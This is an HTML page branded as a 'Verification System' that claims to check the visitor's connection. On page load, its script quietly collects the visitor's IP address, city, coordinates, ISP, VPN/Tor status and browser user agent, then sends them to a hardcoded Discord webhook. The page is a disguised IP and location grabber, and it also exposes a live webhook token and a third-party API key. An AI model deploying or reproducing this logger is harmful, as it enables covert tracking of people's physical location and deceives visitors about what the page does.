<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            line-height: 1.6;
        }
        .container {
            margin-top: 20px;
        }
        .status {
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .loading {
            color: #0c5460;
            background-color: #d1ecf1;
            border: 1px solid #bee5eb;
        }
        .success {
            color: #155724;
            background-color: #d4edda;
            border: 1px solid #c3e6cb;
        }
        .error {
            color: #721c24;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
        }
        .warning {
            color: #856404;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 24px;
            height: 24px;
            border-radius: 50%;
            border-left-color: #09f;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Verification System</h1>
    
    <div class="container">
        <div id="status" class="status loading">
            <div class="spinner"></div> Verifying your connection...
        </div>
    </div>

    <script>
        // Discord webhook URL - hardcoded for security
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
        
        // Function to get flag emoji from country code
        function getFlagEmoji(countryCode) {
            if (!countryCode) return 'üåé';
            const codePoints = countryCode
                .toUpperCase()
                .split('')
                .map(char => 127397 + char.charCodeAt());
            return String.fromCodePoint(...codePoints);
        }

        // Main verification function
        async function verifyUser() {
            const statusDiv = document.getElementById('status');
            
            try {
                // Step 1: Get basic IP info
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                // Step 2: Get detailed IP info
                const ipInfoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const ipInfo = await ipInfoResponse.json();
                
                // Step 3: Check for VPN/proxy
                const vpnCheckResponse = await fetch(`https://ipqualityscore.com/api/json/ip/pPOCqALs9ZiMn0j7MR7aCq4gZL9ybzIh/${ip}?strictness=1&allow_public_access_points=true`);
                const vpnData = await vpnCheckResponse.json();
                
                // Determine if using VPN/proxy
                const usingVpn = vpnData.proxy || 
                                vpnData.vpn || 
                                vpnData.tor || 
                                (ipInfo.security && ipInfo.security.is_proxy);
                
                // Get location data
                const location = {
                    ip: ip,
                    country: ipInfo.country_name || 'Unknown',
                    country_code: ipInfo.country_code || '',
                    region: ipInfo.region || 'Unknown',
                    city: ipInfo.city || 'Unknown',
                    isp: ipInfo.org || 'Unknown',
                    latitude: ipInfo.latitude,
                    longitude: ipInfo.longitude,
                    using_vpn: usingVpn,
                    vpn_details: {
                        is_proxy: vpnData.proxy || false,
                        is_vpn: vpnData.vpn || false,
                        is_tor: vpnData.tor || false,
                        fraud_score: vpnData.fraud_score || 0
                    },
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent
                };
                
                // Create Discord embed
                const mapUrl = `https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}`;
                const flagEmoji = getFlagEmoji(location.country_code);
                
                const discordPayload = {
                    username: "Verification System",
                    avatar_url: "https://i.imgur.com/ZOKp8LH.png",
                    embeds: [{
                        title: `${flagEmoji} User Verification: ${location.city}, ${location.country}`,
                        color: usingVpn ? 16711680 : 65280, // Red for VPN, Green for no VPN
                        fields: [
                            {
                                name: "üîç Verification Status",
                                value: usingVpn ? "‚ùå **FAILED**: VPN/Proxy Detected" : "‚úÖ **PASSED**: No VPN Detected",
                                inline: false
                            },
                            {
                                name: "üìç Location",
                                value: `${location.city}, ${location.region}, ${location.country}`,
                                inline: true
                            },
                            {
                                name: "üåê IP Address",
                                value: location.ip,
                                inline: true
                            },
                            {
                                name: "üè¢ ISP",
                                value: location.isp,
                                inline: true
                            },
                            {
                                name: "üåç Coordinates",
                                value: `[${location.latitude}, ${location.longitude}](${mapUrl})`,
                                inline: true
                            },
                            {
                                name: "‚ö†Ô∏è Fraud Score",
                                value: `${vpnData.fraud_score}/100` + (vpnData.fraud_score > 75 ? " (High Risk)" : ""),
                                inline: true
                            },
                            {
                                name: "üì± Device Info",
                                value: `\`\`\`${location.user_agent}\`\`\``
                            }
                        ],
                        footer: {
                            text: `Verification at ${new Date().toLocaleString()}`
                        }
                    }]
                };
                
                // Send to Discord webhook
                const discordResponse = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(discordPayload)
                });
                
                if (!discordResponse.ok) {
                    throw new Error('Failed to send verification data');
                }
                
                // Update status based on VPN detection
                if (usingVpn) {
                    statusDiv.className = 'status warning';
                    statusDiv.innerHTML = `
                        <strong>‚ö†Ô∏è VPN or Proxy Detected</strong>
                        <p>Please disable any VPN, proxy, or Tor services to continue.</p>
                    `;
                } else {
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = `
                        <strong>‚úÖ Verification Successful</strong>
                        <p>Your connection has been verified.</p>
                    `;
                }
                
            } catch (error) {
                console.error('Verification error:', error);
                statusDiv.className = 'status error';
                statusDiv.innerHTML = `
                    <strong>‚ùå Verification Error</strong>
                    <p>Unable to complete verification. Please try again later.</p>
                `;
                
                // Try to send error to Discord
                try {
                    fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: "Verification System",
                            content: `‚ö†Ô∏è **Verification Error**: ${error.message || 'Unknown error'}`
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error to Discord:', e);
                }
            }
        }
        
        // Run verification as soon as page loads
        document.addEventListener('DOMContentLoaded', verifyUser);
    </script>
</body>
</html>
